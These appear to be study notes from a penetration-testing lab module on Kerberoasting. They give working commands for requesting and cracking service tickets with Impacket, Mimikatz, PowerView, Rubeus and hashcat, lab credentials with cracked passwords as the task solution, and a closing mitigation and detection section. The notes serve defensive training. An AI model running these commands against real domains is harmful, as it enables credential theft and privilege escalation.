### Kerberoasting - from Linux

```
# Kerberoasting is a lateral movement/privilege escalation technique in Active Directory environments. 
# This attack targets Service Principal Names (SPN) accounts. 
# SPNs are unique identifiers that Kerberos uses to map a service instance to a service account in whose context the service is running. 
# Domain accounts are often used to run services to overcome the network authentication limitations 
# of built-in accounts such as NT AUTHORITY\LOCAL SERVICE. 
```

```
# Domain accounts running services are often local administrators, if not highly privileged domain accounts. 
# Due to the distributed nature of systems, interacting services, and associated data transfers, 
# service accounts may be granted administrator privileges on multiple servers across the enterprise. 
# Many services require elevated privileges on various systems, so service accounts are often added to privileged groups, 
# such as Domain Admins, either directly or via nested membership.
```

```
# Finding SPNs associated with highly privileged accounts in a Windows environment is very common. 
# Retrieving a Kerberos ticket for an account with an SPN does not by itself allow you to execute commands in the context of this account. 
# However, the ticket (TGS-REP) is encrypted with the service account’s NTLM hash, 
# so the cleartext password can potentially be obtained by subjecting it to an offline brute-force attack with a tool such as Hashcat.
```

### Kerberoasting - Performing the Attack

[runas](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771525(v=ws.11))

```
# Depending on your position in a network, this attack can be performed in multiple ways:

- From a non-domain joined Linux host using valid domain user credentials.
- From a domain-joined Linux host as root after retrieving the keytab file.
- From a domain-joined Windows host authenticated as a domain user.
- From a domain-joined Windows host with a shell in the context of a domain account.
- As SYSTEM on a domain-joined Windows host.
- From a non-domain joined Windows host using runas /netonly.
```

[GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py)

Rubeus

```
# Several tools can be utilized to perform the attack:

- Impacket’s GetUserSPNs.py from a non-domain joined Linux host.
- A combination of the built-in setspn.exe Windows binary, PowerShell, and Mimikatz.
- From Windows, utilizing tools such as PowerView, Rubeus, and other PowerShell scripts.
```

```
# Obtaining a TGS ticket via Kerberoasting does not guarantee you a set of valid credentials, 
# and the ticket must still be cracked offline with a tool such as Hashcat to obtain the cleartext password. 
# TGS tickets take longer to crack than other formats such as NTLM hashes, 
# so often, unless a weak password is set, it can be difficult or impossible to obtain the cleartext using a standard cracking rig.
```

#### Performing the Attack

```
# Kerberoasting attacks are easily done now using automated tools and scripts. 
# We will cover performing this attack in various ways, both from a Linux and a Windows attack host. 
# Let's first go through how to do this from a Linux host. 
# The following section will walk through a "semi-manual" way of performing the attack and two quick, 
# automated attacks using common open-source tools, all from a Windows attack host.
```

### Kerberoasting with GetUserSPNs.py

[Impacket toolkit](https://github.com/SecureAuthCorp/impacket)

```
# A prerequisite to performing Kerberoasting attacks is either domain user credentials 
# (cleartext or just an NTLM hash if using Impacket), a shell in the context of a domain user, 
# or account such as SYSTEM. Once we have this level of access, we can start. 
# We must also know which host in the domain is a Domain Controller so we can query it. 
```

```
# Let's start by installing the Impacket toolkit. 
# After cloning the repository, we can cd into the directory and install it as follows:

sudo python3 -m pip install .                # Install tool
GetUserSPNs.py -h                            # Listing GetUserSPNs.py Help Options

GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend             # Listing SPN Accounts with GetUserSPNs.py
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request    # Requesting all TGS Tickets
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev            # Requesting a Single TGS ticket
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs    # Save TGS Ticket

hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt            # Cracking the Ticket Offline with Hashcat (Cracked)
sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!                 # Testing Authentication against a Domain Controller
```

### Task Solution

```
SSH to 10.129.46.110 (ACADEMY-EA-ATTACK01) with user "htb-student" and password "HTB_@cademy_stdnt!" 

ssh htb-student@10.129.46.110      # ssh to start instance

# using creds from prev labs (hint) - forend:Klmcargo2

GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request      # check Kerb tickets, and look group of Sap account.
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user SAPService                      # check target SAPservice
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user SAPService -outputfile sap_tgs  # save ticket to file

# Or carefully copy paster output to file. 
# E.g. using echo to fill the file, remember that $ can escape parts of tgs hash. Double check hash in the file.

sudo hashcat -m 13100 sap_tgs /usr/share/wordlists/rockyou.txt            # Cracking with Hashcat (on localhost, !SapperFi2)
```

### Kerberoasting - from Windows

#### Semi Manual method

[setspn](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241(v=ws.11))

```
# Before tools such as Rubeus existed, stealing or forging Kerberos tickets was a complex, manual process. 
# As the tactic and defenses have evolved, we can now perform Kerberoasting from Windows in multiple ways. 
# To start down this path, we will explore the manual route and then move into more automated tooling. 
# Let's begin with the built-in setspn binary to enumerate SPNs in the domain.


C:\htb> setspn.exe -Q */*                     # Enumerating SPNs with setspn.exe
```

```
# We will notice many different SPNs returned for the various hosts in the domain. 
# We will focus on user accounts and ignore the computer accounts returned by the tool. 
# Next, using PowerShell, we can request TGS tickets for an account in the shell above and load them into memory. 
# Once they are loaded into memory, we can extract them using Mimikatz. 
# Let's try this by targeting a single user:


PS C:\htb> Add-Type -AssemblyName System.IdentityModel
PS C:\htb> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"

# Before moving on, let's break down the commands above to see what we are doing 
# (which is essentially what is used by Rubeus when using the default Kerberoasting method):

- The Add-Type cmdlet is used to add a .NET framework class to our PowerShell session, 
  which can then be instantiated like any .NET framework object

- The -AssemblyName parameter allows us to specify an assembly that contains types that we are interested in using

- System.IdentityModel is a namespace that contains different classes for building security token services

- We'll then use the New-Object cmdlet to create an instance of a .NET Framework object

- We'll use the System.IdentityModel.Tokens namespace with the KerberosRequestorSecurityToken class to create 
  a security token and pass the SPN name to the class to request a Kerberos TGS ticket for the target account 
  in our current logon session
```

```
# Retrieving All Tickets Using setspn.exe

PS C:\htb> setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

# The above command combines the previous command with setspn.exe to request tickets for all accounts with SPNs set.
```

### Extracting Tickets from Memory with Mimikatz

[kirbi2john.py](https://raw.githubusercontent.com/nidem/kerberoast/907bf234745fe907cf85f3fd916d1c14ab9d65c0/kirbi2john.py)

```
Using 'mimikatz.log' for logfile : OK

mimikatz # base64 /out:true
isBase64InterceptInput  is false
isBase64InterceptOutput is true

mimikatz # kerberos::list /export


# If we do not specify the base64 /out:true command, Mimikatz will extract the tickets and write them to .kirbi files. 
# Depending on our position on the network and if we can easily move files to our attack host, 
# this can be easier when we go to crack the tickets. 
# Let's take the base64 blob retrieved above and prepare it for cracking.

# Next, we can take the base64 blob and remove new lines and white spaces since the output is column wrapped, 
# and we need it all on one line for the next step.

echo "<base64 blob>" |  tr -d \\n              # Preparing the Base64 Blob for Cracking

# We can place the above single line of output into a file and convert it back to a .kirbi file using the base64 utility.

cat encoded_file | base64 -d > sqldev.kirbi    # Placing the Output into a File as .kirbi

# Next, we can use this version of the kirbi2john.py tool to extract the Kerberos ticket from the TGS file.

python2.7 kirbi2john.py sqldev.kirbi           # Extracting the Kerberos Ticket using kirbi2john.py

# This will create a file called crack_file. We then must modify the file a bit to be able to use Hashcat against the hash.

sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat     # Modifiying crack_file for Hashcat

# Now we can check and confirm that we have a hash that can be fed to Hashcat.

cat sqldev_tgs_hashcat                         # Viewing the Prepared Hash

# We can then run the ticket through Hashcat again and get the cleartext password database!.

hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt       # Cracking the Hash with Hashcat

# If we decide to skip the base64 output with Mimikatz and type mimikatz # kerberos::list /export, the .kirbi file (or files) 
# will be written to disk. In this case, we can download the file(s) and run kirbi2john.py against them directly, 
# skipping the base64 decoding step.

# Now that we have seen the older, more manual way to perform Kerberoasting from a Windows machine and offline processing, 
# let's look at some quicker ways. 
```

### Automated / Tool Based Route

```
# Next, we'll cover two much quicker ways to perform Kerberoasting from a Windows host. 
# First, let's use PowerView to extract the TGS tickets and convert them to Hashcat format. 
# We can start by enumerating SPN accounts.
```

```
# Using PowerView to Extract TGS Tickets:

PS C:\htb> Import-Module .\PowerView.ps1
PS C:\htb> Get-DomainUser * -spn | select samaccountname

# From here, we could target a specific user and retrieve the TGS ticket in Hashcat format.
# Using PowerView to Target a Specific User:

PS C:\htb> Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat

# Finally, we can export all tickets to a CSV file for offline processing.
# Exporting All Tickets to a CSV File:

PS C:\htb> Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation


# Viewing the Contents of the .CSV File:

PS C:\htb> cat .\ilfreight_tgs.csv

# We can also use Rubeus from GhostPack to perform Kerberoasting even faster and easier. 
# Rubeus provides us with a variety of options for performing Kerberoasting.
```

```
# Using Rubeus:

PS C:\htb> .\Rubeus.exe            # You will see big help info with bunch of diff commands

# As we can see from scrolling the Rubeus help menu, the tool has a vast number of options for interacting with Kerberos, 
# most of which are out of the scope of this module and will be covered in-depth in later modules on advanced Kerberos attacks. 

- Performing Kerberoasting and outputting hashes to a file
- Using alternate credentials
- Performing Kerberoasting combined with a pass-the-ticket attack
- Performing "opsec" Kerberoasting to filter out AES-enabled accounts
- Requesting tickets for accounts passwords set between a specific date range
- Placing a limit on the number of tickets requested
- Performing AES Kerberoasting

PS C:\htb> .\Rubeus.exe kerberoast /stats        # Using the /stats Flag

# Let's use Rubeus to request tickets for accounts with the admincount attribute set to 1. 
# These would likely be high-value targets and worth our initial focus for offline cracking efforts with Hashcat. 
# Be sure to specify the /nowrap flag so that the hash can be more easily copied down for offline cracking using Hashcat. 
# Per the documentation, the ""/nowrap" flag prevents any base64 ticket blobs from being column wrapped for any function"; 
# therefore, we won't have to worry about trimming white space or newlines before cracking with Hashcat.

PS C:\htb> .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```

### A Note on Encryption Types

```
# Kerberoasting tools typically request RC4 encryption when performing the attack and initiating TGS-REQ requests. 
# This is because RC4 is weaker and easier to crack offline using tools such as Hashcat than other encryption algorithms 
# such as AES-128 and AES-256. When performing Kerberoasting in most environments, 
# we will retrieve hashes that begin with $krb5tgs$23$*, an RC4 (type 23) encrypted ticket. 
# Sometimes we will receive an AES-256 (type 18) encrypted hash or hash that begins with $krb5tgs$18$*. 
# While it is possible to crack AES-128 (type 17) and AES-256 (type 18) TGS tickets using Hashcat, 
# it will typically be significantly more time consuming than cracking an RC4 (type 23) encrypted ticket, 
# but still possible especially if a weak password is chosen.
```

[chart](https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/decrypting-the-selection-of-supported-kerberos-encryption-types/ba-p/1628797)

```
# Let's start by creating an SPN account named testspn and using Rubeus to Kerberoast this specific user to test this out. 
# As we can see, we received the TGS ticket RC4 (type 23) encrypted.

PS C:\htb> .\Rubeus.exe kerberoast /user:testspn /nowrap

# Checking with PowerView, we can see that the msDS-SupportedEncryptionTypes attribute is set to 0. 
# The chart above tells us that a decimal value of 0 means that a specific encryption type is not defined 
# and set to the default of RC4_HMAC_MD5.

PS C:\htb> Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
```

```
# Cracking the Ticket with Hashcat & rockyou.txt

hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt 
```

```
# Let's assume that our client has set SPN accounts to support AES 128/256 encryption.
# If we check this with PowerView, we'll see that the msDS-SupportedEncryptionTypes attribute is set to 24, 
# meaning that AES 128/256 encryption types are the only ones supported.

# Checking Supported Encryption Types:

PS C:\htb> Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes

# Requesting a new ticket with Rubeus will show us that the account name is using AES-256 (type 18) encryption.:

PS C:\htb>  .\Rubeus.exe kerberoast /user:testspn /nowrap

# To run this through Hashcat, we need to use hash mode 19700, which is Kerberos 5, etype 18, TGS-REP (AES256-CTS-HMAC-SHA1-96) 
# per the handy Hashcat example_hashes table. 
# We run the AES hash as follows and check the status, which shows it should take over 23 minutes 
# to run through the entire rockyou.txt wordlist by typing s to see the status of the cracking job.

hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt     # Running Hashcat & Checking the Status of the Cracking Job

# When the hash finally cracks, we see that it took 4 minutes 36 seconds for a relatively simple password on a CPU. 
# This would be greatly magnified with a stronger/longer password.
```

### Using the /tgtdeleg Flag

```
# We can use Rubeus with the /tgtdeleg flag to specify that we want only RC4 encryption when requesting a new service ticket. 
# The tool does this by specifying RC4 encryption as the only algorithm we support in the body of the TGS request. 
# This may be a failsafe built-in to Active Directory for backward compatibility. 
# By using this flag, we can request an RC4 (type 23) encrypted ticket that can be cracked much faster.


PS C:\htb>  .\Rubeus.exe kerberoast /tgtdeleg /user:testspn /nowrap

# In the above image, we can see that when supplying the /tgtdeleg flag, 
# the tool requested an RC4 ticket even though the supported encryption types are listed as AES 128/256.

# This simple example shows the importance of detailed enumeration and digging deeper when performing attacks such as Kerberoasting.  
# Here we could downgrade from AES to RC4 and cut cracking time down by over 4 minutes and 30 seconds. 
# In a real-world engagement where we have a strong GPU password cracking rig at our disposal, 
# this type of downgrade could result in a hash cracking in a few hours instead of a few days and could make and break our assessment.
```

```
# It is possible to edit the encryption types used by Kerberos. This can be done by opening Group Policy, 
# editing the Default Domain Policy, and choosing: 
# Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options, 
# then double-clicking on Network security: Configure encryption types allowed for Kerberos 
# and selecting the desired encryption type allowed for Kerberos. 

# Removing all other encryption types except for RC4_HMAC_MD5 would allow for the above downgrade example to occur in 2019. 
# Removing support for AES would introduce a security flaw into AD and should likely never be done. 

# Furthermore, removing support for RC4 regardless of the Domain Controller Windows Server version 
# or domain functional level could have operational impacts and should be thoroughly tested before implementation.
```

### Mitigation & Detection

```
# An important mitigation for non-managed service accounts is to set a long and complex password or passphrase 
# that does not appear in any word list and would take far too long to crack. 
# However, it is recommended to use Managed Service Accounts (MSA), and Group Managed Service Accounts (gMSA), 
# which use very complex passwords, and automatically rotate on a set interval (like machine accounts) 
# or accounts set up with LAPS.
```

[Managed Service Accounts (MSA)](https://techcommunity.microsoft.com/t5/ask-the-directory-services-team/managed-service-accounts-understanding-implementing-best/ba-p/397009)

[Group Managed Service Accounts (gMSA)](https://docs.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview)

```
# Kerberoasting requests Kerberos TGS tickets with RC4 encryption, 
# which should not be the majority of Kerberos activity within a domain. 

# When Kerberoasting is occurring in the environment, we will see an abnormal number of TGS-REQ 
# and TGS-REP requests and responses, signaling the use of automated Kerberoasting tools. 

# Domain controllers can be configured to log Kerberos TGS ticket requests 
# by selecting Audit Kerberos Service Ticket Operations within Group Policy.
```

```
# Doing so will generate two separate event IDs: 
# 4769: A Kerberos service ticket was requested, and 
# 4770: A Kerberos service ticket was renewed. 
# 10-20 Kerberos TGS requests for a given account can be considered normal in a given environment. 
# A large amount of 4769 event IDs from one account within a short period may indicate an attack.
```

```
# Imagine we see many event ID 4769 being logged in succession, which appears to be anomalous behavior. 
# Clicking into one, we can see that a Kerberos service ticket was requested by the htb-student user (attacker) 
# for the sqldev account (target). 

# We can also see that the ticket encryption type is 0x17, which is the hex value for 23 (DES_CBC_CRC, DES_CBC_MD5, RC4, AES 256), 
# meaning that the requested ticket was RC4, so if the password was weak, 
# there is a good chance that the attacker would be able to crack it and gain control of the sqldev account.
```

This excellent post above by Sean Metcalf highlights some mitigation and detection strategies for Kerberoasting.
```

### Continuing Onwards

```
# Now that we have a set of (hopefully privileged) credentials, we can move on to see where we can use the credentials. 
# We may be able to:

- Access a host via RDP or WinRM as a local user or a local admin
- Authenticate to a remote host as an admin using a tool such as PsExec
- Gain access to a sensitive file share
- Gain MSSQL access to a host as a DBA user, which can then be leveraged to escalate privileges

# Regardless of our access, we will also want to dig deeper into the domain for other flaws 
# and misconfigurations that can help us expand our access and add to our report to provide more value to our clients.
```
